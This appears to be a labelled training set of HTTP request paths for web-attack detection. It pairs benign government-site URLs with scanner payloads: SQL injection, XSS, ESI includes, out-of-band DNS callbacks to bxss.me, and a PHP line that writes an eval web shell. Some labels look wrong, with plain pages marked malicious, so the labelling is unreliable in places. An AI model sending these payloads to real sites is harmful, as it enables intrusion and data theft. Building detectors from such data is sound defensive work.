request	label
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtjgpt6q6kndbxb9mfoswt7e=&openid=ovl7jjoc3u10omiqe_inffrqjqn0&outer_str=52577&activate_ticket=fdzv9emqaffrnr3xboqhby4/g04lx2t/acqyk4nammvoo8dbj5 fzedtzplsmcarxvioeup9q6wjeq/7lecrlphztencmiem2 /cx88nmao=	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u7231\u4f60\u5b9d\u8d1d\u7ae5\u88c5\u5e97	0
/*******/kbiz.php	1
"/****/zfwjn/"""" """"a"""".concat(70-3).concat(22*4).concat(108).concat(83).concat(120).concat(88) (require""""socket""""
socket.gethostbyname(""""hithz"""" """"khesiext19bfe.bxss.me."""")[3].to_s) """"/1104/list.html"	1
/****/gjzqq/nmz/agt/201412/w020141212329436550256.jpg	0
"/************/template/jcse/110105008056111/16/images/plugin'""""()&%<acx><script >qwkg(9876)</script>/selectpick/css.css"	1
/***/blockdata/getsearchinfo.do?&title=\u4e3b\u4ee3	0
/****/spjj/201707/t20170717_271851.html	0
/**********/system/2021/12/01/javascript:void(0);	1
"/***/col6/index.html"""" and """"x""""=""""y"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6559\u5e08	0
/****/zfxxgk/zfxxgkzn/202004/p020200408381269478807.doc	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5fb7\u65b0\u505c\u8f66\u573a	0
/****/xxgkml/qtfdxx/zdjcyjzj/201908/t20190827_141526.html	0
/****/bmkx/sfgw/201610/t20161025_14172.html	0
/**********/system/2021/10/22/013468413.shtml	0
/**********/system/2021/12/04/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u798f\u7f18\u805a\u9ec4\u7116\u9e21\u7c73\u996d\u5e97	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9686\u6e56\u987a\u53d1\u7535\u52a8\u5de5\u5177\u5546\u884c	0
/**********/system/2016/09/12/012128025.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7f8e\u5a6d\u517b\u751f\u9986	0
/*******/qiye/b-e2027806.html	0
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
"/******/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/js/newcalendar/wdatepicker.js"	1
/**********/system/2021/09/15/013451820.shtml	0
/****/ljx/ldyl	0
/****/xqdt/hnx/201801/t20180109_98851.html	0
/*****/system/2019/04/04/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9c9c\u5c1a\u9c9c\u679c\u5e97	0
"/****/czgk/bmyjs/zzqjcyxt/plxrmjcy/\""javascript:void(0)\"""	1
/****/bygk/byfzhi/fzgcang/202009/t20200909_172072.html	0
/****/bmkx/jyj/201610/t20161025_9630.html	0
/zwxx_11337/****/202112/t20211201_3175766_zzb.html	0
/****/system/2013/01/15/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5174\u4ec1\u9547\u9ed1\u4e09\u7cbe\u54c1\u6c34\u679c\u5e97	0
/****/qybs/202010/w020201026372091836553.png	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202111/t20211122_196774.html	0
/*****/202007/t20200701_168748.html?leader=\u5f90\u3000\u5cf0	0
/***/col195/http://bxss.me/t/fit.txt?.jpg.html	1
/*****/static/js/manifest.78803ad7aa2b71cca93e.js	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u8f89\u714c\u7816\u5382	0
/****************/notification/negotiate?access_token=780d80ef-7cab-4d7c-a23f-ae93b37ee594	0
/***/index.php?do=post&id=482&c=dt&a=goods&	1
/zwxx_11337/****/202104/t20210415_2780924.html	0
/****/wdszs/hfsz/202106/t20210603_183483.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u946b\u6e2f\u667a\u80fd\u5e7f\u544a\u6807\u8bc6\u5382	0
/****/qzfwj/201801/t20180115_669627.html/index_1.html	0
/****/zzxxgk/jjhzj/zsxw/202004/t20200420_165764.html	0
/****/category/yidaiyilutupian?page=1 and 7781=7781#	1
/***/003/004/432/00300443216_4f7fa80f.jpg	0
/**********/system/2018/08/22/012683498.shtml	0
"/****/system/2021/09/08/013447520.shtml/<img src=""javascript:alert(166)"">"	1
/*******/jlcorevalue?id=51');select pg_sleep(5)--	1
"/images<esi:include src=""""http://*******/rpb.png""""/>/style.css"	1
/****/byszx/202109/t20210901_186246.html?leader=bxss.me/t/xss.html?	1
/**********/system/2020/05/21/013167139.shtml	0
/*******/zwgk/czgk/bmyjs/zzqfyxt/xxqrmfy/	0
/****/2019xcz/ssfa/201906/t20190614_215912.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u53ec\u8363\u517b\u6b96\u573a	0
/******/tkysj/images/d.gif	0
/***/0/02/05/78/2057831_988364.jpg	0
/****//<script>alert`73906`</script>	1
/****/zjdt/gcjsbzgl/gcjybz'||'.htm	1
/zwxx_11337/****/201705/w020170728413620164986.jpg	0
/******/system/2017/05/22/012316729.shtml	0
/***/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u597d\u5473\u6765\u9e21\u86cb\u704c\u997c\u5e97	0
/******/qhkc/?--></script><script>alert(22)</script>	1
/****/czgk/bmyjs/zzqfyxt/zwszjrmfy/202102/t20210226_2610541.html	0
/*****/system/2016/06/01/012019965.shtml	0
/******/scy_gj_rlzyysj1_03_03.png	0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=shoucang¤tpage=1	0
/****/api/alert(777)	1
/****/bmkx/ssjj/202102/t20210205_177356.html	0
/****/wdsjs/http://bxss.me/t/fit.txt?.jpg/zmhdyc.html	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u9a6c\u6167\u840d\u9992\u5934\u52a0\u5de5\u5e97	0
/********/customer/style/;<script>abuz(9182)</script>	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u70ed\u7c73\u978b\u5e97	0
/***/viewspace-514.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u541b\u76db\u53a8\u536b\u7535\u5668\u7ecf\u9500\u90e8	0
"/' 'a'.concat(70-3).concat(22*4).concat(116).concat(81).concat(105).concat(80) (require'socket'
socket.gethostbyname('hiteu' 'llnfsqrk23ded.bxss.me.')[3].to_s) '/******/202107/t20210723_2938511.html"	1
/****/bmkx/sjsj/202106/local	0
/******/public/2021/11/17/110481.images/v110481_b1637139892133.jpg	0
/zwxx_11337/****/201709/t20170911_474615.html	0
/****/'.gethostbyname(lc('hitzd'.'ahunkdfa35644.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(122).chr(89).chr(98).chr(86).'/2013/list.html	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u90c1\u91d1\u9999\u519c\u5bb6\u4e50	0
/****/zxxksh/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/web/search?channelid=234439%' and 6566=6566 and '%%'='%&orderby=relevance&perpage=24&searchword=1	1
"/***/getsubject?data={""subject_id"":93,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":419,""sign"":""""}"	0
/***/0/01/18/92/1189272_993974.png	0
/***/003/003/775/00300377527_bfffb343.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6c38\u5eb7\u9547\u4e30\u6cf0\u5b88\u9e4f\u74dc\u679c\u6d41\u901a\u7ecf\u7eaa\u4eba	0
/****/whs/yw_1286/202104/t20210428_2802795.html	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u559c\u591a\u591a\u6279\u53d1\u8d85\u5e02	0
/zwxx_11337/****/202103/t20210301_2611209.html	0
/****/ssxklzzjsx/js/jquery1.4.2.js	0
/**********/system/2021/08/24/013439395.shtml	0
/****************/notification/negotiate?access_token=bd2fdc2e-fbf7-4c69-94f6-d85f493ffdec	0
/******/lists?cid=1 ) order by 1 desc,extractvalue(rand(),concat(0x7c,md5(952147028))) desc -- a	1
/****/xxgknb/2018/bmnb2018/201902/w020190225562360754328.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u53c8\u4e00\u65b0\u62c9\u9762\u9986	0
/*********/?a=display&templatefile=<?php file_put_contents('spread.php','<?php  eval($_post[spread]);?>');die();?>	1
"/****/czgk/bmyjs/rmtt/\""javascript:void(0)\"""	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(106).concat(81).concat(106).concat(66) (require""""socket""""
socket.gethostbyname(""""hitjc"""" """"fiiceklq6c003.bxss.me."""")[3].to_s) """"/********/jcse/110105008056111/16/images/hanweb.css"	1
/****/zdlygk'||'/gytdsdfwzs/1.htm	1
/****************/file/loadimage/?id=be3f9b5e-0958-4b7b-90a0-c8d65a933f29&dt=2021-09-15_11:14:32	0
/****/zzxxgk/zrzyj/zfxxgkml_2139/zrzyxx/budongcdj/202106/t20210602_183440.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201708/t20170804_162626.html	0
/****/user/gallery1.php?g_name=<script>alert(77729</script>	1
/hdjl'||'/****/202103/t20210303_2614145.html	1
"/zwgk<esi:include src=""""http://*******/rpb.png""""/>/czgk/bmjs/qtdw/"	1
/****/0520/170052.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u641c\u72d0	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u9177\u838e\u8d1d\u5566\u670d\u88c5\u5e97	0
/*****/003/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/**********/system/2021/12/17/013495899.shtml	0
/****/zt/msss/msxw/201707/t20170705_329164.html	0
/****/contact-e36396.json?company_id=36396&article_id=0&version=v3&type=header	1
"/**/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
/****/\ufffd\ufffd\ufffd\ufffd\ufffd\u077d\ufffd\ufffd\u017f\ufffd	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5c0f\u51af\u7535\u6c14\u710a\u4fee\u7406\u90e8	0
/****/bmkx/sgaj/202007/w020200727361417504196.jpg	0
/**********/system/2021/06/01/013394592.shtml	0
"/****/news/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/****/bmkx/jtysj/202002/t20200210_147749.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u65ed\u6052\u6c34\u6696\u7ecf\u9500\u90e8	0
/****/system/2006/08/23/000001313.shtml	0
/zwxx_11337/****/202111/t20211112_3125687.html	0
/****/zdlygk/ncwywfgz'||'/gys/bsj/zcwj.htm	1
/****/ypj/yw/202006/t20200628_2146882.html	0
"/****/gfxwj/202012/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/***/003/003/747/00300374794_19dd5009.jpg	0
/******/resource/interview/room.jsp?wbinterviewid=1033') and 1854=1854 and ('1'='1&owner=1707212448	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8fdc\u7b1b\u5b66\u751f\u6821\u5916\u5c31\u9910\u4f11\u606f\u70b9	0
/****/system/2016/12/08/javascript:window.close();	1
/*******/hkbktvw0.php	1
/***/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)>	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u7ea2\u5bfa\u5821\u533a\u9a6c\u536b\u5c71\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u4f1f\u534e\u8fd0\u8f93\u90e8	0
/***/interface/comul_total.json.jsp?callback=jquery19108454713374350198_1639991169910	0
"/**/ui/lib/jquery/' 'a'.concat(70-3).concat(22*4).concat(107).concat(72).concat(119).concat(89) (require'socket'
socket.gethostbyname('hitlb' 'omajymvf966b1.bxss.me.')[3].to_s) '.js"	1
/******/?q=1' or 4964=4964 /*	1
/************/template/bxss.me/110105008056111/16/images/ui.css	1
"/"""".gethostbyname(lc(""""hitew"""".""""ruoafrve96ca3.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(110).chr(68).chr(118).chr(66).""""/****/sgaj/201812/t20181208_112298.html"	1
/************/interfaces/dimension.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=请输入关键词&ranksign=&searchid=if(now()=sysdate(),sleep(15),0)&total=&tpl=16&websiteid=110105008056111	1
/*********/treasury/index.aspx?nodeid=394 and 5949=5949	1
"/**/<img src=""javascript:alert(4728)"">"	1
"/****/czgk<esi:include src=""""http://bxss.me/rpb.png""""/>/bmjs/gdyx/"	1
/****/bmkx/sswj/202006/t20200604_167323.html	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u9a6c\u6210\u8fde\u88c1\u7f1d\u90e8	0
/****/bmkx/snmj/202003/w020200312341080854929.png	0
/**/ui/lib/jquery/jquery.min' and 2*3*8=6*8 and 'qdck'='qdck.js	1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwsb	0
/****************/notification?access_token=c9fb9f61-38f2-40a9-a2f8-036b05df216b&id=undefined	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') or 3305=3305 and '1'='1&perpage=15&outlinepage=10	1
/****/czgk/bmyjs/index_3.html	0
/******/system/2019/08/27/javascript:window.close();	1
/****/xxgknb/2011/list.html?new='.gethostbyname(lc('hitpd'.'zvtfvfka3658c.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(111).chr(74).chr(107).chr(70).'	1
/**/state/service/166/exec	1
/****/lhn/tpbd/	0
"/****/wdsjs/hfswsj/202109/t20210906_"""".gethostbyname(lc(""""hitgw"""".""""ghkeqehp8d902.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(121).chr(66).chr(120).chr(82)."""".html"	1
/****/qyzz/zjb/	1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202011/t20201124_174273.html	0
/****/system/2017/02/17/javascript:dozoom(12)	1
/****/system/more/907000000000000/0000/907000000000000_00000001.shtml	0
/***/0/01/97/36/1973641_180965.jpg	0
/****************/notification/negotiate?access_token=19a8da8a-6b41-4f99-9c41-70780b1d8584	0
/****/czgk/bmyjs/qtdw/zzqnfb/201903/t20190305_1298407.html	0
/******/system/2017/11/17/javascript:window.close();	1
/****/zt/yqfkzccs/yqfkdt/index_56.html	0
/***/blockdata/getsearchinfo.do?&title=\u5168\u8d23	0
/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=if(now()=sysdate(),sleep(15),0)&pg=1&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/******/zdxm/	0
/****/category/silushangji?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9	1
/****/bmkx/scl/202102/t20210203_177287.html	0
/****/system/2020/12/29/javascript:void(0);	1
/******/nxrq_priv_phonebg_4.png	0
/****/bmkx/jtysj/202002/t20200218_147974.html	0
"/******/1/pc.js/<img src=""javascript:alert(502)"">"	1
/****/czgk/bmjs/zzqfyxt/lwsrmfy/	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwsb/	0
/**********/system/2020/03/11/013110857.shtml	0
/****/zt/lxyz/202111/t20211125_3150598.html	0
/**/viewspace-671.html	0
"/****/wzdt<esi:include src=""""http://bxss.me/rpb.png""""/>/"	1
/***/player.swf?autostart=true&file=<script>alert(2766)</script>	1
"/************/template/jcse/110105008056111/16/"""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(75).concat(116).concat(81) (require""""socket""""
socket.gethostbyname(""""hitte"""" """"uqapdmcm2d82b.bxss.me."""")[3].to_s) """"/plugin/hotnews/js.js"	1
/******/public/2021/12/08/20211208_17d97c5d4fb_r1.mp4	0
/zwxx_11337/****/202101/t20210115_2571119.html	0
/****/qzfwj/201912/p020211011378284545600.pdf	0
"/**/ui/lib'""""()&%<acx><script >smws(9802)</script>/easyui/plugins/jquery.panel.js"	1
/**********/system/2021/12/20/013497237.shtml	0
/***/interface/daily_clickcount.json.jsp?callback=jquery191025862948460166235_1640035608229	0
/***/interface/url_total_pv.json.jsp?callback=jquery19106738674046181976_1640035127926	0
/zwxx_11337/****/202112/t20211217_3230216.html/index_1.html	0
/****/qzfwj/list_1.html	1
/***/0/00/39/74/397425_571100.jpg	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtgc8zw947xazpxgmrik5lmm=&openid=ovl7jjnk-p4zgqyubwhxgatu5kmy&outer_str=30205&activate_ticket=fdzv9emqaffrnr3xboqhb/uni si9cgo2jzftvfzsz1hfifidrt1ejnprxbtx1zvjilgakdpe7jvljpfyvz5u2uoggqirjeovpsorzezhki=	0
/xwdt%' and 2*3*8=6*8 and 'krzg'!='krzg%/****/czjs/gzdt.htm	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1366&h=768&treeid=1001&refer=&pagename=l2luzgv4lmpzca==&newsid=-1	0
/************/search.do?begin=if(now()=sysdate(),sleep(15),0)&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/***/0/02/10/17/2101758_454645.jpg	0
/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/'.gethostbyname(lc('hitvq'.'eokcjlhhf1e34.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(120).chr(78).chr(121).chr(81).'.html	1
/****/zhengce/zfwjn/201904/t20190415_116400.html	0
/****/api/apiautographcontroller/findsigner	0
/zwxx_11337/****/201812/w020181220550185760038.jpg	0
/****/web/search?channelid=222832&searchword=\u6cfe\u6e90\u53bf\u5143\u840d\u624b\u5de5\u998d\u5e97	0
/*******/qiye/home-e49643.html	0
/****/zl/ldyl/	0
/**********/system/2020/09/03/013239462.shtml	0
/**/ourbusiness/projectcontracting/201501/w020150108452311577862.jpg	0
/*****/b-e1254478.html	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19109059037360975437_1640035122233	0
/****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/******/system/2017/10/24/012449743.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u7396\u5473\u8c03\u6599\u5e97	0
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/********/jcse/110105008056111/16/images/autocomplete.js"	1
/*****/system/2021/11/02/013473928.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u91d1\u82b1\u7efc\u5408\u5546\u5e97	0
/**/viewspace-820.html	0
/***********/zaojianpinglun/?_=1640025947142	0
/****/20201217/e112491692.html	0
/***/web/sa3/addholiday.do	1
"/"""".gethostbyname(lc(""""hitvj"""".""""ifdudbvl905c5.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(112).chr(74).chr(104).chr(86).""""/******/fdzdgknr/qtfdxx/"	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e8e\u5baa\u5b97\u8bca\u6240	0
"/***/col264/index.html"""" and """"x""""=""""x"	1
/****/if(now()=sysdate(),sleep(12),0)/ncwywfgz/gys/bsj/zcwj.htm	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u5586\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/*******/f5z8cq33.php	1
/****/czgk/bmjs/zzqjcyxt/xxqrmjcy/	0
/wp-content/*******/login-wall-nwxbw/login_wall.php?login=cmd	1
"/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
/****/bmkx/sjcy/202107/t20210720_184728_wap.html	0
/zwxx_11337/****/202003/t20200325_2001362.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u91d1\u8363\u541b\u5b8f\u52b3\u52a1\u6709\u9650\u516c\u53f8	0
/********/images/xy-icon-search.png?code=17cc9e163e5	0
/************/template/jcse/bxss.me/16/images/plugin/waterpull/pinterest_grid.js	1
/*****/system/2021/08/13/013434232.shtml	0
/*****/?loginid=00343099&stamp=1640053463618&token=c666a274e18c536d2fd1eeac4bada3999ddf1d14&hrn=00343099	0
/******/system/2017/12/06/javascript:window.close();	1
/****/qzfwj/201912/t20191224_1901208.html	0
/*****/system/2020/10/14/javascript:void();	1
/zwxx_11337/****/index_31.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201811	0
/****/web/search?channelid=222832&searchword=\u9686\u5fb7\u53bf\u6d77\u5f66\u95e8\u5e02\u90e8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u675c\u5b9d\u5a25\u7ea2\u67a3\u7ecf\u9500\u90e8	0
/****/zzxxgk/bmfgj/fgztzl/hjcnjb/images/p020190411429795370135.png	0
/****/zzxxgk/jjhzj/gyjzq/jtx_3666/202105/t20210519_182752.html	0
/****/zt/msss/msxw/201808/t20180808_953508.html	0
/**/aboutus/leadership/boardofdirectors/	1
/****/jgzn' and 2*3*8=6*8 and '7et6'='7et6/znjs.htm	1
/***/resource/js/***/webuploader/webuploader.min/style.css?v=17	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9e4f\u5a9b\u5546\u5e97	0
/****/czgk/bmjs/zzqjcyxt/jfqrmjcy/201805/t20180524_765602.html	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u83ab\u83ab\u7199\u978b\u5e97	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5174\u9686\u62db\u5f85\u6240	0
/zwxx_11337/****/202006/w020200601657398537632.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u9f99\u9f99\u7ef4\u4fee\u90e8	0
/**/system/2021/12/12/012229570.shtml	0
/****/xxgkml/qtfdxx/zcjd/szcjd/202103/p020210331369289454189.doc	0
/**********/system/2021/09/18/013453574.shtml	0
/****/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/************/template/jcse/110105008056111//xfs.bxss.me/images/searchbtn.js	1
/****/wdsjs/hfswsj/201809/t20180906_109735.html	1
"/************/0""""xor(if(now()=sysdate(),sleep(6),0))xor""""z/2019-04-19/270.html"	1
"/***/col19/index.html"""" and """"x""""=""""y"	1
/****/dqgz/202110/w020211027502472410776.jpg	0
/*****/images/zjxt.gif	0
/****/ztly/zrfg/201911/t20191122_1859214.html	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u6e90\u76db\u7ecf\u8d38\u6709\u9650\u8d23\u4efb\u516c\u53f8	0
"/*****/advanced-search/?term=asdf&""><script>alert(777)</script>"	1
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj/	0
/*******/qiye/businesses-e45862_33.html?category_id=	0
/***/mobile_h5/waparticledetail.do?article_id=202111031425281137&contenttype=article	0
/****/system/2021/05/21/javascript:dozoom(12)	1
/****/mtgz/mt16/201609/t20160907_98976.html	0
/*****/20210526/	1
/****/czgk/bmjs/rmtt/kx/201708/t20170818_549598.html	0
/***/0/02/12/38/2123828_159679.png	0
/zwxx_11337/****/201811/t20181113_1163299.html	0
"/***/col11/index.html/""><script>alert(5760)</script>"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u60a6\u99a8\u517b\u751f\u7f8e\u5bb9\u8218	0
/***/0/01/22/50/1225016_596729.jpg	0
/***/0/01/28/02/1280225_651739.jpg	0
/**/nameko.php?op=999&id=&colorset=violet&fontsize=11; }</style><script>alert(777)</script><style>body { font-size:66	1
